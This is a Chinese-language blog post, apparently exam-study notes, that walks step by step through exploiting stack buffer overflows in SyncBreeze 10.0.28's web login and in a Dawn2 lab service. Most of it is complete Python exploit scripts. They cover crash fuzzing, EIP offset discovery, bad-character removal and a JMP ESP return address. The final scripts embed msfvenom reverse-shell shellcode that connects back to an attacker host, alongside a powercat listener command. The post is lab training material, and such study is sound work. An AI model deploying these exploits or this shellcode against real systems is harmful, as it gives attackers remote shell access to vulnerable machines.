---
layer: article
title: Windows缓冲区溢出漏洞记录
tags: pentest
---



为了考试，半夜恶补，以下内容基本属于零基础入门，大佬请直接飞过。

为了应试，简单复现并整理记录。

现阶段，细致一些的做法是7步，熟练以后可以个人适当调整。

1. 测试漏洞存在
2. 替换求长度
3. EIP替换验证
4. 测试可写空间
5. 测试坏字符
6. 找EIP并测试
7. 上shellcode

## 准备条件

### 环境

| 名称                      | IP             |
| ------------------------- | -------------- |
| Windows 7 X86             | 192.168.10.117 |
| Attack                    | 192.168.10.118 |


### Python

版本：Python 3.8.10

### Immunity Debugger



安装在`D:\Program Files\Immunity Inc\Immunity Debugger\`目录

### Mona.py 

https://github.com/corelan/mona

把mona.py放到`D:\Program Files\Immunity Inc\Immunity Debugger\PyCommands` 目录

在`Immunity Debugger`界面最下方生成`bytearray.bin`

```bash
!mona bytearray -cpb \x00
```

`D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin`

## SyncBreeze version 10.0.28

用到的文件 [SyncBreeze version 10.0.28](https://www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe)  下载地址为[exploit-db](https://www.exploit-db.com/)提供

安装后，双击桌面图标，Tools → Advanced Options → Server，勾选Enable Web Server on Port ，开启80端口，点击Save，并关闭windows系统防火墙。

在Attack主机上访问http://192.168.10.117/即可

问题出在http://192.168.10.117/login登陆时`username`字段

### 1.测试漏洞存在

```python
#!/usr/bin/python2
import socket
try:
  print "\nSending evil buffer..."
  size = 800
  inputBuffer = "A" * size
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.10.117\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.10.117/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.10.117", 80))
  s.send(buffer)

  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"

```



### 2.替换求长度

``` bash
$ msf-pattern_create -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba

```



```python
#!/usr/bin/python2
import socket
try:
  print "\nSending evil buffer..."
  inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.10.117\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.10.117/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.10.117", 80))
  s.send(buffer)

  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"

```

![2](F:\Users\ms\Desktop\w\2.PNG)

看EIP

```bash
$ msf-pattern_offset -l 800 -q 42306142
```



### 3.EIP替换验证

```python
#!/usr/bin/python2
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 780
  eip = "B" * 4
  buffer = "C" * 16
  inputBuffer = filler + eip + buffer
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.10.117\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.10.117/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.10.117", 80))
  s.send(buffer)

  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"

```

![3](F:\Users\ms\Desktop\w\3.PNG)

### 4.测试可写空间

```bash
#!/usr/bin/python2
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4
  buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + buffer
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.10.117\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.10.117/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.10.117", 80))
  s.send(buffer)

  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"

```

![4](F:\Users\ms\Desktop\w\4.PNG)

### 5.测试坏字符

```bash
#!/usr/bin/python2
import socket
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
  print "\nSending evil buffer..."
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4
  inputBuffer = filler + eip + offset + badchars
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.10.117\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.10.117/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.10.117", 80))
  s.send(buffer)

  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"

```

使用mona.py减少眼瞎，反复操作起来

- 生成剔除坏字符的bin

```bash
!mona bytearray -cpb \x00
!mona bytearray -cpb \x00\x0a
!mona bytearray -cpb \x00\x0a\x0d
!mona bytearray -cpb \x00\x0a\x0d\x25
!mona bytearray -cpb \x00\x0a\x0d\x25\x26
!mona bytearray -cpb \x00\x0a\x0d\x25\x26\x2b\x3d

```

- 对比，复制出来增加到上面，并在py脚本中剔除

  ~~~bash
  ```
  !mona compare -a esp -f  "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"
  ```
  ~~~

  ![5](F:\Users\ms\Desktop\w\5.PNG)

### 6.找EIP并测试

执行寻找全false

```bash
!mona modules
```

![6](F:\Users\ms\Desktop\w\6.PNG)

```bash
$ msf-nasm_shell                       
nasm > jmp esp
00000000  FFE4              jmp esp
```

**！注意**

```
jmp esp
PUSH ESP; RET
CALL ESP
```

对应

```bash
!mona find -s "\xff\xe4" -m "libspp.dll"
!mona find -s "\x54\xc3" -m "libspp.dll"
!mona find -s "\xff\xd4" -m "libspp.dll"
```

以`!mona find -s "\xff\xe4" -m "libspp.dll"`为例，得到

![7](F:\Users\ms\Desktop\w\7.PNG)

```bash
Log data, item 3
 Address=10090C83
 Message=  0x10090c83 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (D:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
地址 10090C83
```

#### 地址反转

```bash
 10090C83  →  830C0910 →  \x83\x0C\x09\x10
```

```python
#!/usr/bin/python2
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 780
  eip = "\x83\x0c\x09\x10"       # 倒序
  offset = "C" * 4
  buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + buffer
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 192.168.10.117\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://192.168.10.117/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.10.117", 80))
  s.send(buffer)

  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"

```

![8](F:\Users\ms\Desktop\w\8.PNG)


### 7.上shellcode

```bash
# Windows
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.118 LPORT=4444 -f c -b "\x00\x0A\x0D\x25\x26\x2B\x3D" EXITFUNC=thread
# Linux 本机不是
$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.10.118 LPORT=444 -f python -b "\x00\x0A\x0D\x25\x26\x2B\x3D"
```
本地监听
```powershell
#管理员权限
set-executionpolicy remotesigned
cd E:\Pentest\powershell\powercat
Import-Module .\powercat.ps1
powercat -l -p 4444

```

```python
#!/usr/bin/python2
import socket
try:
    print "\nSending evil buffer..."
    shellcode = ("\xba\x4f\x9c\xb4\xa0\xdb\xde\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
    "\x52\x31\x50\x12\x83\xc0\x04\x03\x1f\x92\x56\x55\x63\x42\x14"
    "\x96\x9b\x93\x79\x1e\x7e\xa2\xb9\x44\x0b\x95\x09\x0e\x59\x1a"
    "\xe1\x42\x49\xa9\x87\x4a\x7e\x1a\x2d\xad\xb1\x9b\x1e\x8d\xd0"
    "\x1f\x5d\xc2\x32\x21\xae\x17\x33\x66\xd3\xda\x61\x3f\x9f\x49"
    "\x95\x34\xd5\x51\x1e\x06\xfb\xd1\xc3\xdf\xfa\xf0\x52\x6b\xa5"
    "\xd2\x55\xb8\xdd\x5a\x4d\xdd\xd8\x15\xe6\x15\x96\xa7\x2e\x64"
    "\x57\x0b\x0f\x48\xaa\x55\x48\x6f\x55\x20\xa0\x93\xe8\x33\x77"
    "\xe9\x36\xb1\x63\x49\xbc\x61\x4f\x6b\x11\xf7\x04\x67\xde\x73"
    "\x42\x64\xe1\x50\xf9\x90\x6a\x57\x2d\x11\x28\x7c\xe9\x79\xea"
    "\x1d\xa8\x27\x5d\x21\xaa\x87\x02\x87\xa1\x2a\x56\xba\xe8\x22"
    "\x9b\xf7\x12\xb3\xb3\x80\x61\x81\x1c\x3b\xed\xa9\xd5\xe5\xea"
    "\xce\xcf\x52\x64\x31\xf0\xa2\xad\xf6\xa4\xf2\xc5\xdf\xc4\x98"
    "\x15\xdf\x10\x0e\x45\x4f\xcb\xef\x35\x2f\xbb\x87\x5f\xa0\xe4"
    "\xb8\x60\x6a\x8d\x53\x9b\xfd\x72\x0b\xa9\x8b\x1a\x4e\xad\x62"
    "\x87\xc7\x4b\xee\x27\x8e\xc4\x87\xde\x8b\x9e\x36\x1e\x06\xdb"
    "\x79\x94\xa5\x1c\x37\x5d\xc3\x0e\xa0\xad\x9e\x6c\x67\xb1\x34"
    "\x18\xeb\x20\xd3\xd8\x62\x59\x4c\x8f\x23\xaf\x85\x45\xde\x96"
    "\x3f\x7b\x23\x4e\x07\x3f\xf8\xb3\x86\xbe\x8d\x88\xac\xd0\x4b"
    "\x10\xe9\x84\x03\x47\xa7\x72\xe2\x31\x09\x2c\xbc\xee\xc3\xb8"
    "\x39\xdd\xd3\xbe\x45\x08\xa2\x5e\xf7\xe5\xf3\x61\x38\x62\xf4"
    "\x1a\x24\x12\xfb\xf1\xec\x32\x1e\xd3\x18\xdb\x87\xb6\xa0\x86"
    "\x37\x6d\xe6\xbe\xbb\x87\x97\x44\xa3\xe2\x92\x01\x63\x1f\xef"
    "\x1a\x06\x1f\x5c\x1a\x03")

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10 


    inputBuffer = filler + eip + offset + nops + shellcode

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.10.117\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.10.117/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.10.117", 80))
    s.send(buffer)

    s.close()

    print "\nDone did you get a reverse shell?"
except:
    print "\nCould not connect!"

```

![9](F:\Users\ms\Desktop\w\9.PNG)

## Dawn2

### 1.测试漏洞存在

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.1.122"
port = 1985

buff = "A" * 300
nullByte = "\x00"

inputBuffer = buff + nullByte
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(inputBuffer)
s.close()
```



### 2.替换求长度

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.1.122"

port = 1985

buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
nullByte = "\x00"

inputBuffer = buff + nullByte

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(inputBuffer)
```



### 3.EIP替换验证

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.1.122"

port = 1985

buff = "A"*272
eip = "B" * 4
buffer = "C" * 24
nullByte = "\x00"

inputBuffer = buff + eip + buffer + nullByte

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(inputBuffer)
```



### 4.测试可写空间

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.1.122"

port = 1985

buff = "A"*272
eip = "B" * 4
buffer = "C" * (800-len(buff) - len(eip))
nullByte = "\x00"

inputBuffer = buff + eip + buffer + nullByte

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(inputBuffer)
```



### 5.测试坏字符

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.1.122"

port = 1985

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

buff = "A"*272
eip = "B" * 4
buffer = badchars
nullByte = "\x00"

inputBuffer = buff + eip + buffer + nullByte

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(inputBuffer)
```



### 6.找EIP并测试

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.1.122"

port = 1985
#34581777   \x77\x17\x58\x34
#345964BA

buff = "A"*272
eip = '\x77\x17\x58\x34'
nullByte = "\x00"
buffer = "C" * (800-len(buff) - len(eip))

inputBuffer = buff + eip + buffer + nullByte

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(inputBuffer)
```



### 7.上shellcode

```python
#!/usr/bin/python2
import socket
import sys
import os

ip = "192.168.10.117"

port = 1985
#34581777   \x77\x17\x58\x34
#345964BA

buff = "A"*272
eip = '\x77\x17\x58\x34'
nullByte = "\x00"
nops = "\x90" * 10 
shellcode = ("\xba\x4f\x9c\xb4\xa0\xdb\xde\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
    "\x52\x31\x50\x12\x83\xc0\x04\x03\x1f\x92\x56\x55\x63\x42\x14"
    "\x96\x9b\x93\x79\x1e\x7e\xa2\xb9\x44\x0b\x95\x09\x0e\x59\x1a"
    "\xe1\x42\x49\xa9\x87\x4a\x7e\x1a\x2d\xad\xb1\x9b\x1e\x8d\xd0"
    "\x1f\x5d\xc2\x32\x21\xae\x17\x33\x66\xd3\xda\x61\x3f\x9f\x49"
    "\x95\x34\xd5\x51\x1e\x06\xfb\xd1\xc3\xdf\xfa\xf0\x52\x6b\xa5"
    "\xd2\x55\xb8\xdd\x5a\x4d\xdd\xd8\x15\xe6\x15\x96\xa7\x2e\x64"
    "\x57\x0b\x0f\x48\xaa\x55\x48\x6f\x55\x20\xa0\x93\xe8\x33\x77"
    "\xe9\x36\xb1\x63\x49\xbc\x61\x4f\x6b\x11\xf7\x04\x67\xde\x73"
    "\x42\x64\xe1\x50\xf9\x90\x6a\x57\x2d\x11\x28\x7c\xe9\x79\xea"
    "\x1d\xa8\x27\x5d\x21\xaa\x87\x02\x87\xa1\x2a\x56\xba\xe8\x22"
    "\x9b\xf7\x12\xb3\xb3\x80\x61\x81\x1c\x3b\xed\xa9\xd5\xe5\xea"
    "\xce\xcf\x52\x64\x31\xf0\xa2\xad\xf6\xa4\xf2\xc5\xdf\xc4\x98"
    "\x15\xdf\x10\x0e\x45\x4f\xcb\xef\x35\x2f\xbb\x87\x5f\xa0\xe4"
    "\xb8\x60\x6a\x8d\x53\x9b\xfd\x72\x0b\xa9\x8b\x1a\x4e\xad\x62"
    "\x87\xc7\x4b\xee\x27\x8e\xc4\x87\xde\x8b\x9e\x36\x1e\x06\xdb"
    "\x79\x94\xa5\x1c\x37\x5d\xc3\x0e\xa0\xad\x9e\x6c\x67\xb1\x34"
    "\x18\xeb\x20\xd3\xd8\x62\x59\x4c\x8f\x23\xaf\x85\x45\xde\x96"
    "\x3f\x7b\x23\x4e\x07\x3f\xf8\xb3\x86\xbe\x8d\x88\xac\xd0\x4b"
    "\x10\xe9\x84\x03\x47\xa7\x72\xe2\x31\x09\x2c\xbc\xee\xc3\xb8"
    "\x39\xdd\xd3\xbe\x45\x08\xa2\x5e\xf7\xe5\xf3\x61\x38\x62\xf4"
    "\x1a\x24\x12\xfb\xf1\xec\x32\x1e\xd3\x18\xdb\x87\xb6\xa0\x86"
    "\x37\x6d\xe6\xbe\xbb\x87\x97\x44\xa3\xe2\x92\x01\x63\x1f\xef"
    "\x1a\x06\x1f\x5c\x1a\x03")


inputBuffer = buff + eip + nops  + shellcode + nullByte

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(inputBuffer)
```

